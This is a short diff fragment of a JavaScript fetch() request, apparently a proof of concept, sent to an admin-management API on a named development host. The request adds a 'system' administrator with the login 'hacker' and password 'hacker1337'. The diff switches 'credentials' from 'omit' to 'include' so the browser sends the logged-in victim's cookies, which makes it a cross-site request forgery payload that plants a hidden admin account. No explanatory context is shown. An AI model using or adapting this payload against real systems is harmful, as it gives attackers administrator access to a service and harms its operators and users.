@@ -13,5 +13,5 @@ fetch("https://dev.dngmanage.io/api/admins_action.php", {
   "body": "{\"action\":\"add\",\"login\":\"hacker\",\"password\":\"hacker1337\",\"type\":\"system\",\"commission\":0,\"psp_id\":5}",
   "method": "POST",
   "mode": "cors",
-  "credentials": "omit"
+  "credentials": "include"
 });
